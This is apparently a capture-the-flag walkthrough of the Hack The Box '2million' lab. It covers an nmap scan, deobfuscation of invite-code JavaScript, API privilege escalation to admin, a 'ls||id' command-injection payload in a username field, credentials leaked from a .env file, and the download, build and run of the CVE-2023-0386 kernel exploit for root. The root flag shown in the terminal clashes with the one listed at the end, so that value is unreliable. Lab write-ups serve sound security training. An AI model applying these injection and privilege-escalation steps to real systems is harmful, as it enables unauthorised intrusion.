
Nmap scanning:

~~~
nmap 10.10.11.221 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-11 12:14 EDT
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
~~~


![[Pasted image 20230823181517.png]]

use dev tool to inspect the webpage there the make invite function encoded by the obfuscator method 
obfuscator:

will **automatically convert straightforward source code into a program** that works the same way, but is more difficult to read and understand. Unfortunately, malicious code writers also use these methods to prevent their attack mechanisms from being detected by antimalware tools.

![[Pasted image 20230823181802.png]]

after decode the function we find the url directories to get he invite the code by using the directory 

~~~
/api/v1/invite/to/generate
~~~

![[Pasted image 20230823182038.png]]

after this another encoded directory to get the invite code but it encoded with ROT13 type encode


![[Pasted image 20230823182307.png]]

decode the path and to generate the path 

![[Pasted image 20230823182017.png]]

![[VirtualBox_kali_12_08_2023_21_35_14.png]]


with invite we login into the webpage 

![[Pasted image 20230823182522.png]]

in the page no redirectory pages in the website but the access only redirected in this vpn genarator in this page 

by using the burp suite capture request of the vpn generate and modify the path we get the 

![[Pasted image 20230823184130.png]]


by using the path admin update we update the normal user to the admin

~~~
/api/v1/admin/settings/update
~~~

![[Pasted image 20230823184343.png]]

in this page it shows that invalid content type 

The JSON content of the response indicates an error, specifically that there's an "Invalid content type." The status of "danger" often signifies that there is an issue or error.
- The server being used is `nginx`.
- The content being returned is in `application/json` format

![[Pasted image 20230823185101.png]]

by using the mail parameter we get this response use is admin parameter to we change the user to the admin


![[Pasted image 20230823184946.png]]

 there is the command line injection vuln this page  by this vuln add 'ls||id' with the username parameter  it shows the details 
  
![[Pasted image 20230823185252.png]]

An **.** **env** file is a plain text file which contains environment variables definitions which are designed so your PHP application will parse them, bypassing the Apache, NGINX and PHP-FPM.

by adding the .env with username parameter it shows the wanted informations

![[Pasted image 20230823185918.png]]

username admin
password SuperDuperPass123

~~~
ssh admin@2million.htb
admin@2million.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 22 03:40:48 PM UTC 2023

  System load:           0.0
  Usage of /:            97.1% of 4.82GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             220
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.221
  IPv6 address for eth0: dead:beef::250:56ff:feb9:d775

  => / is using 97.1% of 4.82GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ ls
user.txt

~~~


~~~
admin@2million:~$ cd ../../../
admin@2million:/$ ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
admin@2million:/$ cd tmp
admin@2million:/tmp$ ls
snap-private-tmp
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU
vmware-root_612-2731021090
admin@2million:/tmp$ ls
snap-private-tmp                                                                                                                                                                             
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU
vmware-root_612-2731021090
admin@2million:/tmp$ ls la
ls: cannot access 'la': No such file or directory
admin@2million:/tmp$ ls -la
total 60
drwxrwxrwt 15 root root 4096 Aug 22 15:39 .
drwxr-xr-x 19 root root 4096 Jun  6 10:22 ..
drwxrwxrwt  2 root root 4096 Aug 22 04:13 .font-unix
drwxrwxrwt  2 root root 4096 Aug 22 04:13 .ICE-unix
drwx------  3 root root 4096 Aug 22 04:13 snap-private-tmp
drwx------  3 root root 4096 Aug 22 04:13 systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP                                                                       
drwx------  3 root root 4096 Aug 22 04:13 systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
drwx------  3 root root 4096 Aug 22 04:13 systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
drwx------  3 root root 4096 Aug 22 04:13 systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
drwx------  3 root root 4096 Aug 22 04:13 systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
drwx------  3 root root 4096 Aug 22 08:42 systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU                                                                          
drwxrwxrwt  2 root root 4096 Aug 22 04:13 .Test-unix
drwx------  2 root root 4096 Aug 22 04:13 vmware-root_612-2731021090
drwxrwxrwt  2 root root 4096 Aug 22 04:13 .X11-unix
drwxrwxrwt  2 root root 4096 Aug 22 04:13 .XIM-unix
admin@2million:/tmp$ ls
snap-private-tmp                                                                             
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU
vmware-root_612-2731021090
admin@2million:/tmp$ cd ../../
admin@2million:/$ git clone https://github.com/sxlmnwb/CVE-2023-0386.git
fatal: could not create work tree dir 'CVE-2023-0386': Permission denied
admin@2million:/$ sudo su
[sudo] password for admin: 
admin is not in the sudoers file.  This incident will be reported.
admin@2million:/$ ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
admin@2million:/$ cd tmp
admin@2million:/tmp$ ls
snap-private-tmp
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU
vmware-root_612-2731021090
admin@2million:/tmp$ cd .././
admin@2million:/$ cd root
-bash: cd: root: Permission denied
admin@2million:/$ cd tmp
admin@2million:/tmp$ ls
snap-private-tmp
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU
vmware-root_612-2731021090
admin@2million:/tmp$ ./fuse ./ovlcap/lower ./gc
-bash: ./fuse: No such file or directory
admin@2million:/tmp$ git clone https://github.com/sxlmnwb/CVE-2023-0386.git
Cloning into 'CVE-2023-0386'...
fatal: unable to access 'https://github.com/sxlmnwb/CVE-2023-0386.git/': Could not resolve host: github.com
admin@2million:/tmp$ ls
snap-private-tmp                                                                             
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP                    
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY                 
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw               
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw             
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0            
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU                       
vmware-root_612-2731021090
admin@2million:/tmp$ ls
snap-private-tmp
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU
vmware-root_612-2731021090
admin@2million:/tmp$ git clone https://github.com/sxlmnwb/CVE-2023-0386.git
Cloning into 'CVE-2023-0386'...
fatal: unable to access 'https://github.com/sxlmnwb/CVE-2023-0386.git/': Could not resolve host: github.com
admin@2million:/tmp$ lsls
Command 'lsls' not found, did you mean:
  command 'lsns' from deb util-linux (2.37.2-4ubuntu3)
Try: sudo apt install <deb name>
admin@2million:/tmp$ ls
CVE-2023-0386-master.zip
snap-private-tmp
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU
vmware-root_612-2731021090
admin@2million:/tmp$ unzip CVE-2023-0386-master.zip 
Archive:  CVE-2023-0386-master.zip
737d8f4af6b18123443be2aed97ade5dc3757e63
   creating: CVE-2023-0386-master/
  inflating: CVE-2023-0386-master/Makefile  
  inflating: CVE-2023-0386-master/README.md  
  inflating: CVE-2023-0386-master/exp.c  
  inflating: CVE-2023-0386-master/fuse.c  
  inflating: CVE-2023-0386-master/getshell.c  
   creating: CVE-2023-0386-master/ovlcap/
 extracting: CVE-2023-0386-master/ovlcap/.gitkeep  
   creating: CVE-2023-0386-master/test/
  inflating: CVE-2023-0386-master/test/fuse_test.c  
  inflating: CVE-2023-0386-master/test/mnt  
  inflating: CVE-2023-0386-master/test/mnt.c  
admin@2million:/tmp$ make all
make: *** No rule to make target 'all'.  Stop.
admin@2million:/tmp$ ls
CVE-2023-0386-master
CVE-2023-0386-master.zip
snap-private-tmp
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-memcached.service-TB7xYP
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-ModemManager.service-uzPqPY
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-logind.service-eJ4xdw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-resolved.service-hVCLQw
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-systemd-timesyncd.service-6m2qs0
systemd-private-d8b95cd2bd9647d6bd7d8dbec02c1e60-upower.service-gzprkU
vmware-root_612-2731021090
admin@2million:/tmp$ cd CVE-2023-0386-master/
admin@2million:/tmp/CVE-2023-0386-master$ ls
exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
admin@2million:/tmp/CVE-2023-0386-master$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
admin@2million:/tmp/CVE-2023-0386-master$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
~~~

~~~
admin@2million:/tmp/CVE-2023-0386-master$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
mkdir: File exists
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601

~~~

~~~
dmin@2million:/tmp/CVE-2023-0386-master$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Aug 22 16:04 .
drwxrwxr-x 6 root   root     4096 Aug 22 16:04 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-master# cd ../../../
root@2million:/# cd root
root@2million:/root# ls
root.txt  snap  thank_you.json
root@2million:/root# cat root.txt 
d65d4b97337bf3cd90e8fc0d6f2d53d1
root@2million:/root# 
~~~

 this machine exploit to this vuln # PoC Exploit Released for Linux Kernel Privilege Escalation (CVE-2023-0386) Bug
 
~~~
scp CVE-2023-0386-master.zip admin@2million.htb:/tmp/
admin@2million.htb's password: 
CVE-2023-0386-master.zip
~~~

download the cve in your machine use this send the cve to attacker machine in the tmp directory

scp (secure copy) command in Linux system is **used to copy file(s) between servers in a secure way next open the two terminal and execute this commands

![[Pasted image 20230823192539.png]]


~~~
make all

./fuse ./ovlcap/lower ./gc

./exp
~~~

 
user flag :7fbc357d72e120111032ce63f6dbf5ed

root flag :cda6379a622cc526e4f4330c703c61b1


reference 
https://securityonline.info/poc-exploit-released-for-linux-kernel-privilege-escalation-cve-2023-0386-bug/
https://github.com/sxlmnwb/CVE-2023-0386

